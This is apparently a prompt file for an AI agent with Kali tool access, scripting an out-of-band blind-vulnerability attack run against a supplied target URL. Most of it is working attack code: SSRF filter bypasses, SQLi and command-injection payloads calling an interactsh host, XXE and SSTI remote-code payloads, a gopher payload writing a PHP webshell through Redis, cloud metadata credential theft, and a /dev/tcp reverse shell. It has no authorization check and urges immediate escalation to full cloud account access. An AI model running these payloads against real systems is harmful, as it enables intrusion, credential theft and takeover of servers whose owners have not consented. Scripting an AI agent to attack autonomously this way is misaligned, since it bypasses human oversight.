---
description: OOB blind vulnerability detection — interactsh-based SSRF, blind SQLi, blind command injection, blind XXE, with callback verification
argument-hint: <target-url> [endpoint-path]
allowed-tools: [mcp__kali-pentest__execute_kali_command]
---

# pt-blind — Out-of-Band Blind Vulnerability Detection

You are a senior penetration tester hunting blind vulnerabilities that leave no visible response. Use interactsh as the OOB callback server. Inject into every parameter systematically, then verify callbacks to confirm exploitability.

**When to use**: Run after `/pt` when you suspect blind issues — no response difference, consistent 200 responses with no output change, "fire and forget" style endpoints (webhooks, email, exports).

---

## Step 0 — Setup & Context

```bash
TARGET_URL=<target_url_from_arguments>
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)
LOG=$ENG/loot/interactsh_$TS.log
mkdir -p $ENG/loot $ENG/scans/blind

echo "=== pt-blind: $TARGET_URL ==="
echo "Timestamp: $TS"
echo "Callback log: $LOG"
echo ""

# Check tools
for t in interactsh-client ffuf sqlmap curl nslookup; do
    printf "  %-20s %s\n" "$t" "$(command -v $t 2>/dev/null || echo 'NOT FOUND')"
done
echo ""

# Check interactsh
command -v interactsh-client &>/dev/null || {
    echo "[install] Installing interactsh-client..."
    go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>/dev/null || \
    apt-get install -y interactsh-client 2>/dev/null
}
```

---

## Phase 0 — Start Interactsh OOB Listener

```bash
ENG=/home/kali/current
TS=$(date +%Y%m%d_%H%M%S)
LOG=$ENG/loot/interactsh_$TS.log

echo "=== [Phase 0] Starting interactsh-client ==="
echo "Connecting to oast.pro callback server..."
echo ""

# Start interactsh in background, capture OAST domain
interactsh-client -server oast.pro -token "" \
    | tee $LOG &
IACT_PID=$!
echo "interactsh PID: $IACT_PID"

# Wait for the domain to be assigned (appears in first line of output)
sleep 5
OAST_DOMAIN=$(grep -oE '[a-z0-9]{8,}\.[a-z]{2,5}\.oast\.pro' $LOG 2>/dev/null | head -1)

if [ -z "$OAST_DOMAIN" ]; then
    echo "[WARN] Could not auto-detect OAST domain. Check $LOG manually."
    echo "Alternative: Use Burp Collaborator — replace OAST_DOMAIN with your Burp collaborator host"
else
    echo "OAST_DOMAIN: $OAST_DOMAIN"
    echo "Callbacks will appear in: $LOG"
fi
echo ""
echo "NOTE: Keep interactsh running throughout all phases."
echo "      Check for callbacks after each phase with: grep -E 'dns|http|smtp' $LOG"
```

---

## Phase 1 — Blind SSRF Detection

```bash
TARGET_URL=<target_url>
OAST_DOMAIN=<oast_domain_from_phase0>
ENG=/home/kali/current
LOG=$ENG/loot/interactsh_*.log  # use latest

echo "=== [Phase 1] Blind SSRF ==="
echo "Injecting OAST domain into SSRF-prone parameters..."
echo ""

# Common SSRF parameters
SSRF_PARAMS="url callback webhook redirect next dest return data fetch src target site path remote load import file link"

for param in $SSRF_PARAMS; do
    # GET parameter injection
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        "$TARGET_URL?$param=http://ssrf-${param}.$OAST_DOMAIN/" 2>/dev/null)
    [ "$code" != "000" ] && echo "  GET ?$param=http://ssrf-$param.$OAST_DOMAIN/ → $code"
done

echo ""
echo "--- Header-based SSRF ---"
for header in "X-Forwarded-For" "X-Original-URL" "X-Rewrite-URL" "Referer" "Origin" "X-Forwarded-Host"; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "$header: http://hdr-ssrf.$OAST_DOMAIN/" \
        "$TARGET_URL" 2>/dev/null)
    [ "$code" != "000" ] && echo "  $header: http://hdr-ssrf.$OAST_DOMAIN/ → $code"
done

echo ""
echo "--- POST body SSRF ---"
for param in url callback webhook redirect; do
    curl -sk -o /dev/null -X POST "$TARGET_URL" \
        -H "Content-Type: application/json" \
        -d "{\"$param\":\"http://post-ssrf-$param.$OAST_DOMAIN/\"}" 2>/dev/null
    curl -sk -o /dev/null -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "$param=http://form-ssrf-$param.$OAST_DOMAIN/" 2>/dev/null
done

echo ""
echo "--- Cloud metadata SSRF payloads (if internal SSRF found via different method) ---"
echo "  AWS:   http://169.254.169.254/latest/meta-data/"
echo "  GCP:   http://metadata.google.internal/computeMetadata/v1/"
echo "  Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01"
echo ""
echo "Injections sent. Checking for callbacks now..."
sleep 10
grep -E "ssrf" $ENG/loot/interactsh_*.log 2>/dev/null | head -20 || echo "[no callbacks yet]"
```

---

## Phase 2 — Blind SQL Injection (Time-Based + OOB DNS)

```bash
TARGET_URL=<target_url>
OAST_DOMAIN=<oast_domain_from_phase0>
ENG=/home/kali/current

echo "=== [Phase 2] Blind SQL Injection ==="
echo "Time-based detection + OOB DNS extraction..."
echo ""

# Time-based baseline: measure normal response time first
T_BASELINE=$(curl -sk -o /dev/null -w "%{time_total}" "$TARGET_URL" 2>/dev/null)
echo "Baseline response time: ${T_BASELINE}s"
echo ""

# Quick time-based probes (manual) — check if response time increases by 5s
echo "--- Time-based probes (manual verification) ---"
for payload in \
    "' OR SLEEP(5)-- -" \
    "'; WAITFOR DELAY '0:0:5'--" \
    "' OR pg_sleep(5)--" \
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)"; do
    T=$(curl -sk -o /dev/null -w "%{time_total}" \
        "$TARGET_URL?id=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" 2>/dev/null)
    echo "  Payload: $payload | Time: ${T}s"
done

echo ""
echo "--- sqlmap OOB DNS + time-based (async — runs in background) ---"
SQLMAP_OUT=$ENG/scans/blind/sqlmap_blind_$TS
mkdir -p $SQLMAP_OUT
nohup sqlmap -u "$TARGET_URL" \
    --level=3 --risk=2 \
    --technique=T,D \
    --dns-domain=$OAST_DOMAIN \
    --batch \
    --timeout=10 \
    --output-dir=$SQLMAP_OUT \
    > $ENG/scans/blind/sqlmap_blind.log 2>&1 &
echo "sqlmap PID: $! (running in background)"
echo "Monitor: tail -f $ENG/scans/blind/sqlmap_blind.log"
echo "Results: $SQLMAP_OUT"
```

---

## Phase 3 — Blind Command Injection

```bash
TARGET_URL=<target_url>
OAST_DOMAIN=<oast_domain_from_phase0>
ENG=/home/kali/current

echo "=== [Phase 3] Blind Command Injection ==="
echo "Injecting OS command payloads that trigger DNS lookups..."
echo ""

# Command injection payloads with OOB DNS callback
PAYLOADS=(
    '$(nslookup ci1.OAST)'
    '`nslookup ci2.OAST`'
    '|nslookup ci3.OAST'
    '||nslookup ci4.OAST||'
    ';nslookup ci5.OAST;'
    '$(curl http://ci6.OAST/ci)'
    '`curl -s http://ci7.OAST/ci`'
    '%0anslookup ci8.OAST'
    '${IFS}nslookup${IFS}ci9.OAST'
    '&&nslookup ci10.OAST&&'
)

# Common injection points
PARAMS="name query search input cmd exec command ping host ip target output filename template"

echo "Injecting into GET parameters..."
for param in $PARAMS; do
    for payload_template in "${PAYLOADS[@]}"; do
        payload="${payload_template/OAST/$OAST_DOMAIN}"
        encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
        curl -sk -o /dev/null "$TARGET_URL?$param=$encoded" 2>/dev/null &
    done
done
wait

echo ""
echo "Injecting into POST body (JSON)..."
for param in $PARAMS; do
    for payload_template in "${PAYLOADS[@]:0:5}"; do
        payload="${payload_template/OAST/$OAST_DOMAIN}"
        curl -sk -o /dev/null -X POST "$TARGET_URL" \
            -H "Content-Type: application/json" \
            -d "{\"$param\":\"$payload\"}" 2>/dev/null &
    done
done
wait

echo ""
echo "Injecting into POST body (form)..."
for param in $PARAMS; do
    payload="\$(nslookup form-ci-${param}.$OAST_DOMAIN)"
    curl -sk -o /dev/null -X POST "$TARGET_URL" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "$param=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)" &
done
wait

echo ""
echo "All payloads sent. Checking callbacks in 15s..."
sleep 15
CALLBACKS=$(grep -c "ci[0-9]\|ci-" $ENG/loot/interactsh_*.log 2>/dev/null || echo 0)
echo "CI callbacks received: $CALLBACKS"
grep "ci" $ENG/loot/interactsh_*.log 2>/dev/null | head -10
```

---

## Phase 4 — Blind XXE via File Upload

```bash
TARGET_URL=<target_url>
OAST_DOMAIN=<oast_domain_from_phase0>
ENG=/home/kali/current

echo "=== [Phase 4] Blind XXE via File Upload / XML Input ==="
echo ""

# Generate XXE payloads for different scenarios
# Payload 1: Classic OOB via DOCTYPE
cat > /tmp/blind_xxe_oob.xml << XMLEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe1.$OAST_DOMAIN/">
]>
<root><data>&xxe;</data></root>
XMLEOF

# Payload 2: Parameter entity (for blind error-based)
cat > /tmp/blind_xxe_param.xml << XMLEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "http://xxe2.$OAST_DOMAIN/evil.dtd">
  %remote;
]>
<root><data>test</data></root>
XMLEOF

# Payload 3: SSRF via XInclude (works even without DOCTYPE control)
cat > /tmp/blind_xinclude.xml << XMLEOF
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="http://xxe3.$OAST_DOMAIN/xi"/>
</root>
XMLEOF

# Payload 4: SVG with XXE (for image upload endpoints)
cat > /tmp/blind_xxe.svg << SVGEOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://xxe4.$OAST_DOMAIN/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
SVGEOF

echo "--- Upload endpoints to test ---"
# Try common upload endpoints
for upload_path in /upload /api/upload /file/upload /import /api/import \
                   /document/upload /avatar /profile/picture /api/xml \
                   /api/v1/import /webhook/xml; do
    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET_URL$upload_path" \
        -F "file=@/tmp/blind_xxe_oob.xml;type=text/xml" 2>/dev/null)
    [ "$code" != "000" ] && [ "$code" != "404" ] && \
        echo "  $upload_path (XML): $code — uploading XXE payload"

    code=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X POST "$TARGET_URL$upload_path" \
        -F "file=@/tmp/blind_xxe.svg;type=image/svg+xml" 2>/dev/null)
    [ "$code" != "000" ] && [ "$code" != "404" ] && \
        echo "  $upload_path (SVG): $code — uploading SVG+XXE payload"
done

echo ""
echo "--- XML content-type POST ---"
code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$TARGET_URL" \
    -H "Content-Type: application/xml" \
    -d @/tmp/blind_xxe_oob.xml 2>/dev/null)
echo "  POST application/xml: $code"

echo ""
echo "Checking XXE callbacks..."
sleep 10
grep "xxe" $ENG/loot/interactsh_*.log 2>/dev/null | head -10 || echo "[no XXE callbacks yet]"
```

---

## Phase 5 — SSTI Blind Detection

```bash
TARGET_URL=<target_url>
OAST_DOMAIN=<oast_domain_from_phase0>
ENG=/home/kali/current

echo "=== [Phase 5] Blind SSTI Detection ==="
echo "Math-based detection (no OOB needed) + OOB for confirmed engines..."
echo ""

# Polyglot SSTI detection — the arithmetic results betray the engine
SSTI_POLYGLOT='${"z"*9999}${9999*9999}#{9999*9999}*{9999*9999}@(9999*9999)'
T1=$(curl -sk -o /dev/null -w "%{time_total}" \
    "$TARGET_URL?input=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$SSTI_POLYGLOT'))" 2>/dev/null)" 2>/dev/null)
echo "Polyglot probe: ${T1}s"

# Engine-specific probes
declare -A SSTI_ENGINES=(
    ["jinja2"]='{{7*7}}'
    ["twig"]='{{7*7}}'
    ["freemarker"]='${7*7}'
    ["velocity"]='#set($x=7*7)${x}'
    ["smarty"]='{$smarty.version}'
    ["mako"]='${7*7}'
    ["erb"]='<%= 7*7 %>'
    ["thymeleaf"]='[[${7*7}]]'
)

echo ""
echo "--- Engine-specific math probes ---"
for engine in "${!SSTI_ENGINES[@]}"; do
    payload="${SSTI_ENGINES[$engine]}"
    encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))" 2>/dev/null)
    response=$(curl -sk "$TARGET_URL?input=$encoded" 2>/dev/null | head -c 500)
    echo "$response" | grep -q "49" && echo "  [HIT - $engine] $payload → response contains 49 (7*7=49)"
done

echo ""
echo "--- OOB SSTI (confirms RCE vector in Jinja2/Twig) ---"
OOB_SSTI="{{ ''.__class__.__mro__[1].__subclasses__()[273](['nslookup ssti.$OAST_DOMAIN'], shell=True) }}"
curl -sk -o /dev/null "$TARGET_URL?input=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$OOB_SSTI'))" 2>/dev/null)" 2>/dev/null
sleep 5
grep "ssti" $ENG/loot/interactsh_*.log 2>/dev/null && echo "[SSTI RCE CONFIRMED]" || echo "[no SSTI callback]"
```

---

## Phase 5b — SSRF Advanced: Protocol Smuggling & Filter Bypass

**Why**: Basic SSRF testing probes `http://169.254.169.254` but most real-world filter bypasses require IP encoding tricks or protocol abuse. Gopher protocol unlocks internal service exploitation (Redis → RCE, SMTP → email spoofing).

```bash
TARGET_URL=<target_url>
OAST=<oast_domain>
# Find an SSRF-vulnerable parameter first (Phase 1 above), then use these advanced payloads

SSRF_ENDPOINT="$TARGET_URL/api/fetch"   # replace with confirmed SSRF endpoint
SSRF_PARAM="url"                        # replace with confirmed SSRF parameter

echo "=== Phase 5b: SSRF Advanced ==="

echo "--- Filter Bypass: IP Encoding Variants ---"
# All resolve to 127.0.0.1 — bypass allowlist/denylist checks
for bypass_ip in \
    "http://127.0.0.1/" \
    "http://2130706433/" \
    "http://0x7f000001/" \
    "http://0177.0.0.1/" \
    "http://[::1]/" \
    "http://[::ffff:127.0.0.1]/" \
    "http://127.000.000.001/" \
    "http://127.1/" \
    "http://0/" \
    "http://localhost/" \
    "http://LOCALHOST/" \
    "http://①②⑦.⓪.⓪.①/" \
    "http://127.0.0.1.nip.io/" \
    "http://$OAST@127.0.0.1/" \
    "http://127.0.0.1#@$OAST/"; do

    RESP=$(curl -sk -X POST "$SSRF_ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"$SSRF_PARAM\":\"$bypass_ip\"}" \
        -o /tmp/ssrf_bypass.txt --max-time 5 -w "%{http_code}" 2>/dev/null)
    BODY=$(head -c 100 /tmp/ssrf_bypass.txt 2>/dev/null)
    echo "  $bypass_ip → HTTP $RESP | $(echo $BODY | head -c 60)"
done

echo ""
echo "--- AWS IMDS v2 (requires token exchange) ---"
# IMDSv2 requires PUT first to get token, then use token in GET
TOKEN_RESP=$(curl -sk -X POST "$SSRF_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"$SSRF_PARAM\":\"http://169.254.169.254/latest/api/token\",\"method\":\"PUT\",\"headers\":{\"X-aws-ec2-metadata-token-ttl-seconds\":\"21600\"}}" \
    2>/dev/null | head -c 200)
echo "  IMDSv2 token request: $TOKEN_RESP"
echo "  (if token returned, use it to access /latest/meta-data/iam/security-credentials/)"

echo ""
echo "--- Gopher Protocol: Redis SSRF → RCE ---"
# Gopher lets SSRF speak raw TCP — send Redis RESP commands
# Payload: FLUSHALL + SET / SAVE webshell to /var/www/html/
REDIS_CMD=$(python3 - << 'PYEOF'
import urllib.parse

# Redis commands to write a PHP webshell
commands = [
    "*1\r\n$8\r\nFLUSHALL\r\n",
    "*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$32\r\n\n\n<?php system($_GET['cmd']); ?>\n\n\r\n",
    "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n",
    "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$9\r\nshell.php\r\n",
    "*1\r\n$4\r\nSAVE\r\n",
]

payload = "".join(commands)
encoded = urllib.parse.quote(payload, safe='')
print(f"gopher://127.0.0.1:6379/_{encoded}")
PYEOF
)

echo "  Redis gopher payload (send via SSRF parameter):"
echo "  $REDIS_CMD"
echo ""
echo "  Also test common internal ports via gopher:"
for port in 6379 11211 9200 5432 3306 27017 8080 8443; do
    echo "  gopher://127.0.0.1:$port/_test"
done

echo ""
echo "--- SSRF via PDF Generation (wkhtmltopdf/WeasyPrint) ---"
# If app has PDF generation (invoice, report, receipt):
# Inject <iframe> or <link> tag in template input
for pdf_payload in \
    '<iframe src="file:///etc/passwd"></iframe>' \
    '<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>' \
    '<link rel="import" href="file:///etc/passwd">' \
    '<script>document.write(window.location)</script>'; do
    echo "  PDF payload: $pdf_payload"
done
echo "  → Inject into: invoice address field, report title, user bio rendered to PDF"

echo ""
echo "--- SSRF via DNS Rebinding ---"
echo "  Tool: https://lock.cmpxchg8b.com/rebinder.html (singularity of origin)"
echo "  Flow:"
echo "  1. Set up DNS that alternates 127.0.0.1 ↔ allowed_IP with low TTL"
echo "  2. Server validates URL → DNS resolves to allowed_IP (passes check)"
echo "  3. Server fetches URL → DNS TTL expired → resolves to 127.0.0.1"
echo "  4. Server fetches internal service thinking it's the allowed domain"

echo ""
echo "--- SSRF via URL Redirect ---"
echo "  If server validates URL then follows redirects:"
echo "  1. Put SSRF payload on your server: curl https://attacker.com/redir → 302 → http://169.254.169.254/..."
echo "  2. Send to SSRF endpoint: {url: 'https://attacker.com/redir'}"
echo "  3. Server validates attacker.com (allowed) then follows redirect to internal IP"
```

---

## Phase 6 — Verify Callbacks & Document

```bash
ENG=/home/kali/current

echo "=== [Phase 6] Callback Verification ==="
echo ""
echo "--- All received callbacks ---"
cat $ENG/loot/interactsh_*.log 2>/dev/null | \
    grep -E "^(dns|http|smtp|ftp)" | sort -u | \
    while read line; do
        echo "CALLBACK: $line"
    done

echo ""
echo "--- Summary by vulnerability type ---"
echo "SSRF callbacks:    $(grep -c "ssrf\|hdr-ssrf\|post-ssrf\|form-ssrf" $ENG/loot/interactsh_*.log 2>/dev/null || echo 0)"
echo "SQLi callbacks:    $(grep -c "sqlmap\|sqli" $ENG/loot/interactsh_*.log 2>/dev/null || echo 0)"
echo "CMDi callbacks:    $(grep -c "ci[0-9]\|ci-" $ENG/loot/interactsh_*.log 2>/dev/null || echo 0)"
echo "XXE callbacks:     $(grep -c "xxe" $ENG/loot/interactsh_*.log 2>/dev/null || echo 0)"
echo "SSTI callbacks:    $(grep -c "ssti" $ENG/loot/interactsh_*.log 2>/dev/null || echo 0)"
echo ""

# Save all callbacks to report
echo "=== Full callback log ==="
cat $ENG/loot/interactsh_*.log 2>/dev/null | grep -v "^$" | \
    tee $ENG/poc/requests/blind_callbacks.txt

echo ""
echo "Callback evidence saved: $ENG/poc/requests/blind_callbacks.txt"
echo ""
echo "--- Next steps for confirmed blinds ---"
echo "  Blind SSRF confirmed → test for: cloud IMDS, internal port scan, SSRF to RCE"
echo "  Blind SQLi confirmed → run: sqlmap --dump, --os-shell (if stacked queries)"
echo "  Blind CMDi confirmed → run: reverse shell, exfil /etc/passwd"
echo "  Blind XXE confirmed → read: /etc/passwd, /proc/self/environ, AWS metadata"
echo "  Blind SSTI confirmed → escalate to: RCE via OS command execution"
```

---

## Exploitation Templates (After Confirmation)

Use these after a blind is confirmed via callback:

### SSRF → Cloud Metadata
```bash
TARGET_URL=<target_url>; SSRF_PARAM=<confirmed_ssrf_param>
# AWS IMDS v2
curl -sk "$TARGET_URL?$SSRF_PARAM=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# GCP
curl -sk "$TARGET_URL?$SSRF_PARAM=http://metadata.google.internal/computeMetadata/v1/instance/" \
    -H "Metadata-Flavor: Google"
```

### Blind SQLi → Data Extraction
```bash
TARGET_URL=<target_url>
sqlmap -u "$TARGET_URL" --technique=T,D --level=3 --risk=2 \
    --dump --batch --tables 2>/dev/null | head -50
```

### Blind CMDi → Reverse Shell
```bash
TARGET_URL=<target_url>; CMDI_PARAM=<confirmed_cmdi_param>; KALI_IP=<kali_ip>
# Start listener on Kali
nohup nc -lvnp 4444 > /tmp/revshell.txt 2>&1 &
# Send reverse shell
curl -sk "$TARGET_URL?$CMDI_PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bash -i >& /dev/tcp/$KALI_IP/4444 0>&1'))")"
```

---

## Execution Rules

- **Never stop after one callback** — multiple callbacks mean multiple exploitable endpoints
- **Record the exact OAST subdomain in each payload** — different subdomains per phase let you pinpoint which vector triggered
- **DNS callback = exploitable**, even if HTTP doesn't respond — DNS interaction confirms code execution or SSRF
- **Time delays in Phase 2 probes** — if baseline is 0.2s and response is 5.2s, SQLi is confirmed
- **Interactsh must stay running** throughout all phases — kill it only after Phase 6 verification
- **Save all callbacks as evidence** — the interactsh log IS the proof of exploitability
- **Escalate immediately on confirmation** — blind SSRF on AWS → IMDS credentials → full cloud account access
